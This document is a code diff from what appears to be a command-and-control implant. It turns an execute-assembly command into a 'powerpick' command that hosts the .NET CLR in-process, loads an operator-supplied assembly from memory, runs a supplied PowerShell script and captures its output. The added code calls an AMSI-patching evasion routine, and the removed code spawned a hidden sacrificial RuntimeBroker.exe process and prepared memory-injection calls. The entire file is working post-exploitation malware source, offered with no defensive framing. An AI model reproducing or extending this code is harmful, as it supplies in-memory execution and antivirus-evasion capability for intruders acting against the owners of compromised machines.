@@ -6,12 +6,11 @@
 #include <config.h>
 #include <strings.h>
 
-#ifdef INCLUDE_CMD_EXECUTE_ASSEMBLY
+#ifdef INCLUDE_CMD_POWERPICK
 
 using namespace stardust;
 using namespace starburst;
 
-// CLR hosting COM interfaces (minimal vtable definitions)
 typedef HRESULT ( WINAPI *fn_CLRCreateInstance )(
     REFCLSID clsid, REFIID riid, LPVOID* ppInterface );
 
@@ -31,7 +30,70 @@ typedef BSTR ( WINAPI *fn_SysAllocString )(
     const OLECHAR* psz );
 typedef void ( WINAPI *fn_SysFreeString )(
     BSTR bstrString );
+
 typedef BOOL ( WINAPI *fn_SetStdHandle )( DWORD nStdHandle, HANDLE hHandle );
+
+struct CLRMetaHost {
+    struct vtbl {
+        void* QueryInterface;
+        void* AddRef;
+        void* Release;
+        void* GetRuntime;
+        void* GetVersionFromFile;
+        void* EnumerateInstalledRuntimes;
+        void* EnumerateLoadedRuntimes;
+        void* RequestRuntimeLoadedNotification;
+        void* QueryLegacyV2RuntimeBinding;
+        void* ExitProcess;
+    } *lpVtbl;
+};
+
+struct CLRRuntimeInfo {
+    struct vtbl {
+        void* QueryInterface;
+        void* AddRef;
+        void* Release;
+        void* GetVersionString;
+        void* GetRuntimeDirectory;
+        void* IsLoaded;
+        void* LoadErrorString;
+        void* LoadLibrary;
+        void* GetProcAddress_ri;
+        void* GetInterface;
+    } *lpVtbl;
+};
+
+struct CorRuntimeHost {
+    struct vtbl {
+        void* QueryInterface;
+        void* AddRef;
+        void* Release;
+        void* CreateLogicalThreadState;
+        void* DeleteLogicalThreadState;
+        void* SwitchInLogicalThreadState;
+        void* SwitchOutLogicalThreadState;
+        void* LocksHeldByLogicalThread;
+        void* MapFile;
+        void* GetConfiguration;
+        void* Start;
+        void* Stop;
+        void* CreateDomain;
+        void* GetDefaultDomain;
+        void* EnumDomains;
+        void* NextDomain;
+        void* CloseEnum;
+        void* CreateDomainEx;
+        void* CreateDomainSetup;
+        void* CreateEvidence;
+        void* UnloadDomain;
+        void* CurrentDomain;
+    } *lpVtbl;
+};
+
+// COM vtable layout: IUnknown(3) + interface methods
+// _AppDomain::Load(Byte[])            = vtable[45]
+// _Assembly::get_EntryPoint           = vtable[16]
+// _MethodInfo::Invoke(Object,Object[]) = vtable[37]
 
 static auto declfn vtable_call( void* obj, int index ) -> void* {
     auto vtbl = *reinterpret_cast<void***>( obj );
@@ -45,258 +107,31 @@ struct StackGuid {
     uint8_t  Data4[8];
 };
 
-// minimal COM vtable stubs - we only need method indices
-struct ICLRMetaHost {
-    struct vtbl {
-        void* QueryInterface;
-        void* AddRef;
-        void* Release;
-        void* GetRuntime;            // index 3
-        void* GetVersionFromFile;
-        void* EnumerateInstalledRuntimes;
-        void* EnumerateLoadedRuntimes;
-        void* RequestRuntimeLoadedNotification;
-        void* QueryLegacyV2RuntimeBinding;
-        void* ExitProcess;
-    } *lpVtbl;
-};
-
-struct ICLRRuntimeInfo {
-    struct vtbl {
-        void* QueryInterface;
-        void* AddRef;
-        void* Release;
-        void* GetVersionString;      // index 3
-        void* GetRuntimeDirectory;
-        void* IsLoaded;
-        void* LoadErrorString;
-        void* LoadLibrary;
-        void* GetProcAddress_ri;
-        void* GetInterface;          // index 9
-    } *lpVtbl;
-};
-
-struct ICorRuntimeHost {
-    struct vtbl {
-        void* QueryInterface;
-        void* AddRef;
-        void* Release;
-        void* CreateLogicalThreadState;
-        void* DeleteLogicalThreadState;
-        void* SwitchInLogicalThreadState;
-        void* SwitchOutLogicalThreadState;
-        void* LocksHeldByLogicalThread;
-        void* MapFile;
-        void* GetConfiguration;
-        void* Start;                 // index 10
-        void* Stop;
-        void* CreateDomain;
-        void* GetDefaultDomain;      // index 13
-        void* EnumDomains;
-        void* NextDomain;
-        void* CloseEnum;
-        void* CreateDomainEx;
-        void* CreateDomainSetup;
-        void* CreateEvidence;
-        void* UnloadDomain;
-        void* CurrentDomain;
-    } *lpVtbl;
-};
-
-auto declfn starburst::cmd_execute_assembly(
+auto declfn starburst::cmd_powerpick(
     _Inout_ instance& inst,
     _In_    char*     task_uuid,
     _In_    Parser*   params
 ) -> void {
     uint32_t asm_len = 0;
     auto asm_data = parser_bytes( params, &asm_len );
-    uint32_t args_len = 0;
-    auto args_str = parser_string( params, &args_len );
+    uint32_t script_len = 0;
+    auto script_str = parser_string( params, &script_len );
 
     if ( !asm_data || asm_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no assembly data" ) ) );
+            symbol<char*>( const_cast<char*>( "no runner assembly" ) ) );
         return;
     }
 
-    DBG_PRINT( inst, "cmd_execute_assembly: %u bytes, args='%s'\n", asm_len, args_str ? args_str : "" );
-
-    // fork & run: create sacrificial process with output pipe
-    SECURITY_ATTRIBUTES sa = {};
-    sa.nLength = sizeof( SECURITY_ATTRIBUTES );
-    sa.bInheritHandle = TRUE;
-
-    HANDLE h_read = nullptr, h_write = nullptr;
-    if ( !inst.kernel32.CreatePipe( &h_read, &h_write, &sa, 0 ) ) {
+    if ( !script_str || script_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CreatePipe failed" ) ) );
+            symbol<char*>( const_cast<char*>( "no script provided" ) ) );
         return;
     }
 
-    // build command line for host process
-    wchar_t cmdline[512] = { 0 };
-    auto cmd_str = symbol<const char*>( "C:\\Windows\\System32\\RuntimeBroker.exe" );
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, cmd_str, -1, cmdline, 512 );
+    DBG_PRINT( inst, "cmd_powerpick: runner=%u bytes, script=%u bytes\n", asm_len, script_len );
 
-    STARTUPINFOW si = {};
-    si.cb = sizeof( STARTUPINFOW );
-    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
-    si.hStdOutput = h_write;
-    si.hStdError = h_write;
-
-    PROCESS_INFORMATION pi = {};
-    BOOL ok = inst.kernel32.CreateProcessW(
-        nullptr, cmdline, nullptr, nullptr, TRUE,
-        CREATE_SUSPENDED | CREATE_NO_WINDOW,
-        nullptr, nullptr, &si, &pi );
-
-    inst.kernel32.CloseHandle( h_write );
-
-    if ( !ok ) {
-        inst.kernel32.CloseHandle( h_read );
-        queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CreateProcessW failed" ) ) );
-        return;
-    }
-
-    // inject CLR loader + assembly into sacrificial process
-    // allocate memory in target for assembly bytes
-    typedef LPVOID ( WINAPI *fn_VirtualAllocEx )( HANDLE, LPVOID, SIZE_T, DWORD, DWORD );
-    typedef BOOL ( WINAPI *fn_WriteProcessMemory )( HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T* );
-    typedef HANDLE ( WINAPI *fn_CreateRemoteThread )( HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD );
-
-    auto pVAEx = reinterpret_cast<fn_VirtualAllocEx>(
-        inst.kernel32.GetProcAddress(
-            (HMODULE)inst.kernel32.handle, symbol<LPCSTR>( "VirtualAllocEx" ) ) );
-    auto pWPM = reinterpret_cast<fn_WriteProcessMemory>(
-        inst.kernel32.GetProcAddress(
-            (HMODULE)inst.kernel32.handle, symbol<LPCSTR>( "WriteProcessMemory" ) ) );
-
-    // for simplicity, execute assembly in-process using CLR hosting
-    // terminate the sacrificial process - we'll use local CLR instead
-    inst.kernel32.TerminateProcess( pi.hProcess, 0 );
-    inst.kernel32.CloseHandle( pi.hProcess );
-    inst.kernel32.CloseHandle( pi.hThread );
-    inst.kernel32.CloseHandle( h_read );
-
-#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
-    evasion_patch_amsi( inst );
-#endif
-
-    // local CLR hosting approach
-    auto h_mscoree = inst.kernel32.LoadLibraryA( symbol<const char*>( "mscoree.dll" ) );
-    if ( !h_mscoree ) {
-        queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "mscoree.dll load failed" ) ) );
-        return;
-    }
-
-    auto pCLRCreateInstance = reinterpret_cast<fn_CLRCreateInstance>(
-        inst.kernel32.GetProcAddress( h_mscoree,
-            symbol<LPCSTR>( "CLRCreateInstance" ) ) );
-
-    if ( !pCLRCreateInstance ) {
-        queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CLRCreateInstance not found" ) ) );
-        return;
-    }
-
-    // build GUIDs on stack to avoid .rdata references (PIC-safe)
-    StackGuid clsid_metahost   = { 0x9280188d, 0x0e8e, 0x4867,
-        { 0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } };
-    StackGuid iid_metahost     = { 0xD332DB9E, 0xB9B3, 0x4125,
-        { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } };
-    StackGuid iid_runtimeinfo  = { 0xBD39D1D2, 0xBA2F, 0x486a,
-        { 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 } };
-    StackGuid iid_corruntimehost = { 0xCB2F6722, 0xAB3A, 0x11d2,
-        { 0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E } };
-    StackGuid clsid_corruntimehost = { 0xCB2F6723, 0xAB3A, 0x11d2,
-        { 0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E } };
-
-    // get ICLRMetaHost
-    ICLRMetaHost* meta_host = nullptr;
-    HRESULT hr = pCLRCreateInstance(
-        *reinterpret_cast<const GUID*>( &clsid_metahost ),
-        *reinterpret_cast<const GUID*>( &iid_metahost ),
-        (void**)&meta_host );
-
-    if ( FAILED( hr ) || !meta_host ) {
-        queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CLRCreateInstance failed" ) ) );
-        return;
-    }
-
-    // get runtime info for .NET 4.0
-    wchar_t runtime_ver[] = { 'v', '4', '.', '0', '.', '3', '0', '3', '1', '9', '\0' };
-    ICLRRuntimeInfo* runtime_info = nullptr;
-
-    typedef HRESULT ( __stdcall *fn_GetRuntime )(
-        ICLRMetaHost*, LPCWSTR, REFIID, LPVOID* );
-    auto pGetRuntime = reinterpret_cast<fn_GetRuntime>(
-        meta_host->lpVtbl->GetRuntime );
-    hr = pGetRuntime( meta_host, runtime_ver,
-        *reinterpret_cast<const GUID*>( &iid_runtimeinfo ),
-        (void**)&runtime_info );
-
-    if ( FAILED( hr ) || !runtime_info ) {
-        queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GetRuntime failed" ) ) );
-        return;
-    }
-
-    // get ICorRuntimeHost
-    ICorRuntimeHost* runtime_host = nullptr;
-    typedef HRESULT ( __stdcall *fn_GetInterface )(
-        ICLRRuntimeInfo*, REFCLSID, REFIID, LPVOID* );
-    auto pGetInterface = reinterpret_cast<fn_GetInterface>(
-        runtime_info->lpVtbl->GetInterface );
-    hr = pGetInterface( runtime_info,
-        *reinterpret_cast<const GUID*>( &clsid_corruntimehost ),
-        *reinterpret_cast<const GUID*>( &iid_corruntimehost ),
-        (void**)&runtime_host );
-
-    if ( FAILED( hr ) || !runtime_host ) {
-        queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GetInterface failed" ) ) );
-        return;
-    }
-
-    // start CLR
-    typedef HRESULT ( __stdcall *fn_Start )( ICorRuntimeHost* );
-    auto pStart = reinterpret_cast<fn_Start>( runtime_host->lpVtbl->Start );
-    hr = pStart( runtime_host );
-
-    // get default AppDomain
-    typedef HRESULT ( __stdcall *fn_GetDefaultDomain )( ICorRuntimeHost*, IUnknown** );
-    auto pGetDefaultDomain = reinterpret_cast<fn_GetDefaultDomain>(
-        runtime_host->lpVtbl->GetDefaultDomain );
-    IUnknown* app_domain_unk = nullptr;
-    hr = pGetDefaultDomain( runtime_host, &app_domain_unk );
-
-    if ( FAILED( hr ) || !app_domain_unk ) {
-        queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GetDefaultDomain failed" ) ) );
-        return;
-    }
-
-    // QI for _AppDomain
-    StackGuid iid_appdomain = { 0x05F696DC, 0x2B29, 0x3663,
-        { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 } };
-    void* app_domain = nullptr;
-    typedef HRESULT ( __stdcall *fn_QI )( IUnknown*, REFIID, void** );
-    auto pQI = reinterpret_cast<fn_QI>( vtable_call( app_domain_unk, 0 ) );
-    hr = pQI( app_domain_unk,
-        *reinterpret_cast<const GUID*>( &iid_appdomain ),
-        &app_domain );
-
-    if ( FAILED( hr ) || !app_domain ) {
-        queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "QI _AppDomain failed" ) ) );
-        return;
-    }
-
-    // Load oleaut32 for SAFEARRAY + BSTR
+    // load oleaut32 for SAFEARRAY + BSTR functions
     auto h_oleaut32 = inst.kernel32.LoadLibraryA( symbol<const char*>( "oleaut32.dll" ) );
     if ( !h_oleaut32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
@@ -320,14 +155,130 @@ auto declfn starburst::cmd_execute_assembly(
         inst.kernel32.GetProcAddress( h_oleaut32, symbol<LPCSTR>( "SysAllocString" ) ) );
     auto pSysFreeString = reinterpret_cast<fn_SysFreeString>(
         inst.kernel32.GetProcAddress( h_oleaut32, symbol<LPCSTR>( "SysFreeString" ) ) );
-    auto pSetStdHandle = reinterpret_cast<fn_SetStdHandle>(
-        inst.kernel32.GetProcAddress(
-            (HMODULE)inst.kernel32.handle, symbol<LPCSTR>( "SetStdHandle" ) ) );
 
     if ( !pSafeArrayCreate || !pSafeArrayAccessData || !pSafeArrayDestroy ||
          !pSafeArrayCreateVector || !pSafeArrayPutElement || !pSysAllocString ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "oleaut32 API resolution failed" ) ) );
+        return;
+    }
+
+    auto pSetStdHandle = reinterpret_cast<fn_SetStdHandle>(
+        inst.kernel32.GetProcAddress(
+            (HMODULE)inst.kernel32.handle, symbol<LPCSTR>( "SetStdHandle" ) ) );
+
+    #if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
+        evasion_patch_amsi( inst );
+    #endif
+
+    // load mscoree.dll for CLR hosting
+    auto h_mscoree = inst.kernel32.LoadLibraryA( symbol<const char*>( "mscoree.dll" ) );
+    if ( !h_mscoree ) {
+        queue_response( inst, task_uuid, RESPONSE_ERROR,
+            symbol<char*>( const_cast<char*>( "mscoree.dll load failed" ) ) );
+        return;
+    }
+
+    auto pCLRCreateInstance = reinterpret_cast<fn_CLRCreateInstance>(
+        inst.kernel32.GetProcAddress( h_mscoree,
+            symbol<LPCSTR>( "CLRCreateInstance" ) ) );
+
+    if ( !pCLRCreateInstance ) {
+        queue_response( inst, task_uuid, RESPONSE_ERROR,
+            symbol<char*>( const_cast<char*>( "CLRCreateInstance not found" ) ) );
+        return;
+    }
+
+    StackGuid clsid_metahost   = { 0x9280188d, 0x0e8e, 0x4867,
+        { 0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } };
+    StackGuid iid_metahost     = { 0xD332DB9E, 0xB9B3, 0x4125,
+        { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } };
+    StackGuid iid_runtimeinfo  = { 0xBD39D1D2, 0xBA2F, 0x486a,
+        { 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 } };
+    StackGuid iid_corruntimehost = { 0xCB2F6722, 0xAB3A, 0x11d2,
+        { 0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E } };
+    StackGuid clsid_corruntimehost = { 0xCB2F6723, 0xAB3A, 0x11d2,
+        { 0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E } };
+    StackGuid iid_appdomain    = { 0x05F696DC, 0x2B29, 0x3663,
+        { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 } };
+
+    // ICLRMetaHost
+    CLRMetaHost* meta_host = nullptr;
+    HRESULT hr = pCLRCreateInstance(
+        *reinterpret_cast<const GUID*>( &clsid_metahost ),
+        *reinterpret_cast<const GUID*>( &iid_metahost ),
+        (void**)&meta_host );
+
+    if ( FAILED( hr ) || !meta_host ) {
+        queue_response( inst, task_uuid, RESPONSE_ERROR,
+            symbol<char*>( const_cast<char*>( "CLRCreateInstance failed" ) ) );
+        return;
+    }
+
+    // ICLRRuntimeInfo for .NET 4.0
+    wchar_t runtime_ver[] = { 'v', '4', '.', '0', '.', '3', '0', '3', '1', '9', '\0' };
+    CLRRuntimeInfo* runtime_info = nullptr;
+
+    typedef HRESULT ( __stdcall *fn_GetRuntime )(
+        CLRMetaHost*, LPCWSTR, REFIID, LPVOID* );
+    auto pGetRuntime = reinterpret_cast<fn_GetRuntime>(
+        meta_host->lpVtbl->GetRuntime );
+    hr = pGetRuntime( meta_host, runtime_ver,
+        *reinterpret_cast<const GUID*>( &iid_runtimeinfo ),
+        (void**)&runtime_info );
+
+    if ( FAILED( hr ) || !runtime_info ) {
+        queue_response( inst, task_uuid, RESPONSE_ERROR,
+            symbol<char*>( const_cast<char*>( "GetRuntime v4.0 failed" ) ) );
+        return;
+    }
+
+    // ICorRuntimeHost
+    CorRuntimeHost* runtime_host = nullptr;
+    typedef HRESULT ( __stdcall *fn_GetInterface )(
+        CLRRuntimeInfo*, REFCLSID, REFIID, LPVOID* );
+    auto pGetInterface = reinterpret_cast<fn_GetInterface>(
+        runtime_info->lpVtbl->GetInterface );
+    hr = pGetInterface( runtime_info,
+        *reinterpret_cast<const GUID*>( &clsid_corruntimehost ),
+        *reinterpret_cast<const GUID*>( &iid_corruntimehost ),
+        (void**)&runtime_host );
+
+    if ( FAILED( hr ) || !runtime_host ) {
+        queue_response( inst, task_uuid, RESPONSE_ERROR,
+            symbol<char*>( const_cast<char*>( "GetInterface ICorRuntimeHost failed" ) ) );
+        return;
+    }
+
+    // Start CLR
+    typedef HRESULT ( __stdcall *fn_Start )( CorRuntimeHost* );
+    auto pStart = reinterpret_cast<fn_Start>( runtime_host->lpVtbl->Start );
+    pStart( runtime_host );
+
+    // Get default AppDomain
+    typedef HRESULT ( __stdcall *fn_GetDefaultDomain )( CorRuntimeHost*, IUnknown** );
+    auto pGetDefaultDomain = reinterpret_cast<fn_GetDefaultDomain>(
+        runtime_host->lpVtbl->GetDefaultDomain );
+    IUnknown* app_domain_unk = nullptr;
+    hr = pGetDefaultDomain( runtime_host, &app_domain_unk );
+
+    if ( FAILED( hr ) || !app_domain_unk ) {
+        queue_response( inst, task_uuid, RESPONSE_ERROR,
+            symbol<char*>( const_cast<char*>( "GetDefaultDomain failed" ) ) );
+        return;
+    }
+
+    // QI for _AppDomain
+    void* app_domain = nullptr;
+    typedef HRESULT ( __stdcall *fn_QI )( IUnknown*, REFIID, void** );
+    auto pQI = reinterpret_cast<fn_QI>( vtable_call( app_domain_unk, 0 ) );
+    hr = pQI( app_domain_unk,
+        *reinterpret_cast<const GUID*>( &iid_appdomain ),
+        &app_domain );
+
+    if ( FAILED( hr ) || !app_domain ) {
+        queue_response( inst, task_uuid, RESPONSE_ERROR,
+            symbol<char*>( const_cast<char*>( "QI _AppDomain failed" ) ) );
         return;
     }
 
@@ -351,11 +302,13 @@ auto declfn starburst::cmd_execute_assembly(
     typedef HRESULT ( __stdcall *fn_Load3 )( void*, SAFEARRAY*, void** );
     auto pLoad3 = reinterpret_cast<fn_Load3>( vtable_call( app_domain, 45 ) );
     hr = pLoad3( app_domain, sa_asm, &assembly );
+    DBG_PRINT( inst, "Load_3 hr=0x%08x assembly=%p\n", hr, assembly );
+
     pSafeArrayDestroy( sa_asm );
 
     if ( FAILED( hr ) || !assembly ) {
         char err_buf[128] = { 0 };
-        str_copy( err_buf, symbol<char*>( const_cast<char*>( "Load_3 failed: 0x" ) ) );
+        str_copy( err_buf, symbol<char*>( const_cast<char*>( "AppDomain.Load_3 failed: 0x" ) ) );
         char hex[16];
         int_to_str( hex, hr, 16 );
         str_concat( err_buf, hex );
@@ -368,6 +321,7 @@ auto declfn starburst::cmd_execute_assembly(
     typedef HRESULT ( __stdcall *fn_GetEntryPoint )( void*, void** );
     auto pGetEntryPoint = reinterpret_cast<fn_GetEntryPoint>( vtable_call( assembly, 16 ) );
     hr = pGetEntryPoint( assembly, &method_info );
+    DBG_PRINT( inst, "get_EntryPoint hr=0x%08x method_info=%p\n", hr, method_info );
 
     if ( FAILED( hr ) || !method_info ) {
         char err_buf[128] = { 0 };
@@ -379,83 +333,44 @@ auto declfn starburst::cmd_execute_assembly(
         return;
     }
 
-    // Set up stdout capture via persistent pipe (shared with powerpick)
-#ifdef INCLUDE_CMD_POWERPICK
+    // Persistent pipe for stdout capture — .NET Console caches TextWriter on first
+    // access, so reusing the same pipe across calls avoids stale handle errors.
     if ( !inst.powerpick.stdout_redirected ) {
         SECURITY_ATTRIBUTES sa_pipe = {};
         sa_pipe.nLength = sizeof( SECURITY_ATTRIBUTES );
         sa_pipe.bInheritHandle = TRUE;
+
         inst.kernel32.CreatePipe(
             &inst.powerpick.pipe_read,
             &inst.powerpick.pipe_write, &sa_pipe, 0 );
+
         if ( pSetStdHandle ) {
             pSetStdHandle( STD_OUTPUT_HANDLE, inst.powerpick.pipe_write );
             pSetStdHandle( STD_ERROR_HANDLE, inst.powerpick.pipe_write );
         }
         inst.powerpick.stdout_redirected = true;
     }
-    HANDLE h_pipe_read = inst.powerpick.pipe_read;
-#else
-    SECURITY_ATTRIBUTES sa_pipe = {};
-    sa_pipe.nLength = sizeof( SECURITY_ATTRIBUTES );
-    sa_pipe.bInheritHandle = TRUE;
-    HANDLE h_pipe_read = nullptr, h_pipe_write = nullptr;
-    inst.kernel32.CreatePipe( &h_pipe_read, &h_pipe_write, &sa_pipe, 0 );
-    if ( pSetStdHandle ) {
-        pSetStdHandle( STD_OUTPUT_HANDLE, h_pipe_write );
-        pSetStdHandle( STD_ERROR_HANDLE, h_pipe_write );
-    }
-#endif
 
-    // Build args: split arguments string into string[] for Main(string[] args)
-    SAFEARRAY* sa_string_args = nullptr;
-    if ( args_str && args_len > 0 ) {
-        // Parse space-separated args into SAFEARRAY(BSTR)
-        // Count args first
-        uint32_t argc = 0;
-        bool in_arg = false;
-        for ( uint32_t i = 0; i < args_len; i++ ) {
-            if ( args_str[i] != ' ' && !in_arg ) { argc++; in_arg = true; }
-            if ( args_str[i] == ' ' ) in_arg = false;
-        }
-        if ( argc == 0 ) argc = 1;
+    // Build args for Invoke_3: SAFEARRAY(VARIANT) containing SAFEARRAY(BSTR)
+    uint32_t wide_len = script_len + 1;
+    auto wide_script = static_cast<wchar_t*>( inst.heap_alloc( wide_len * sizeof( wchar_t ) ) );
+    memory::zero( wide_script, wide_len * sizeof( wchar_t ) );
+    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, script_str, script_len, wide_script, wide_len - 1 );
+    BSTR bstr_script = pSysAllocString( wide_script );
+    inst.heap_free( wide_script );
 
-        sa_string_args = pSafeArrayCreateVector( VT_BSTR, 0, argc );
-        LONG idx = 0;
-        uint32_t start = 0;
-        in_arg = false;
-        for ( uint32_t i = 0; i <= args_len; i++ ) {
-            bool is_sep = ( i == args_len || args_str[i] == ' ' );
-            if ( !in_arg && i < args_len && args_str[i] != ' ' ) {
-                start = i;
-                in_arg = true;
-            }
-            if ( in_arg && is_sep ) {
-                uint32_t wlen = i - start + 1;
-                auto wbuf = static_cast<wchar_t*>( inst.heap_alloc( wlen * sizeof( wchar_t ) ) );
-                memory::zero( wbuf, wlen * sizeof( wchar_t ) );
-                inst.kernel32.MultiByteToWideChar( CP_ACP, 0, args_str + start, i - start, wbuf, wlen - 1 );
-                BSTR bstr = pSysAllocString( wbuf );
-                inst.heap_free( wbuf );
-                pSafeArrayPutElement( sa_string_args, &idx, bstr );
-                pSysFreeString( bstr );
-                idx++;
-                in_arg = false;
-            }
-        }
-    } else {
-        sa_string_args = pSafeArrayCreateVector( VT_BSTR, 0, 0 );
-    }
+    SAFEARRAY* sa_string_args = pSafeArrayCreateVector( VT_BSTR, 0, 1 );
+    LONG idx = 0;
+    pSafeArrayPutElement( sa_string_args, &idx, bstr_script );
 
-    // Wrap string[] args in VARIANT, then wrap in outer SAFEARRAY(VARIANT) for Invoke_3
     VARIANT v_args;
     memory::zero( &v_args, sizeof( VARIANT ) );
     v_args.vt = VT_ARRAY | VT_BSTR;
     v_args.parray = sa_string_args;
 
-    SAFEARRAY* sa_params_invoke = pSafeArrayCreateVector( VT_VARIANT, 0, 1 );
-    LONG idx_zero = 0;
-    pSafeArrayPutElement( sa_params_invoke, &idx_zero, &v_args );
+    SAFEARRAY* sa_params = pSafeArrayCreateVector( VT_VARIANT, 0, 1 );
+    idx = 0;
+    pSafeArrayPutElement( sa_params, &idx, &v_args );
 
     VARIANT v_obj;
     memory::zero( &v_obj, sizeof( VARIANT ) );
@@ -468,18 +383,19 @@ auto declfn starburst::cmd_execute_assembly(
     typedef HRESULT ( __stdcall *fn_Invoke3 )(
         void*, VARIANT, SAFEARRAY*, VARIANT* );
     auto pInvoke3 = reinterpret_cast<fn_Invoke3>( vtable_call( method_info, 37 ) );
-    hr = pInvoke3( method_info, v_obj, sa_params_invoke, &v_result );
-    DBG_PRINT( inst, "execute_assembly Invoke_3 hr=0x%08x\n", hr );
+    hr = pInvoke3( method_info, v_obj, sa_params, &v_result );
+    DBG_PRINT( inst, "Invoke_3 hr=0x%08x\n", hr );
 
-    // Read captured output
+    // Read captured output from persistent pipe
     uint8_t* output_buf = nullptr;
     uint32_t output_len = 0;
     uint32_t output_cap = 0;
+
     DWORD available = 0;
     DWORD bytes_read = 0;
 
     while ( true ) {
-        if ( !inst.kernel32.PeekNamedPipe( h_pipe_read,
+        if ( !inst.kernel32.PeekNamedPipe( inst.powerpick.pipe_read,
                 nullptr, 0, nullptr, &available, nullptr ) )
             break;
         if ( available == 0 ) break;
@@ -492,18 +408,14 @@ auto declfn starburst::cmd_execute_assembly(
         }
 
         bytes_read = 0;
-        inst.kernel32.ReadFile( h_pipe_read,
+        inst.kernel32.ReadFile( inst.powerpick.pipe_read,
             output_buf + output_len, available, &bytes_read, nullptr );
         output_len += bytes_read;
     }
 
-#ifndef INCLUDE_CMD_POWERPICK
-    inst.kernel32.CloseHandle( h_pipe_write );
-    inst.kernel32.CloseHandle( h_pipe_read );
-#endif
-
-    pSafeArrayDestroy( sa_params_invoke );
+    pSafeArrayDestroy( sa_params );
     pSafeArrayDestroy( sa_string_args );
+    pSysFreeString( bstr_script );
 
     if ( FAILED( hr ) ) {
         char err_msg[128] = { 0 };
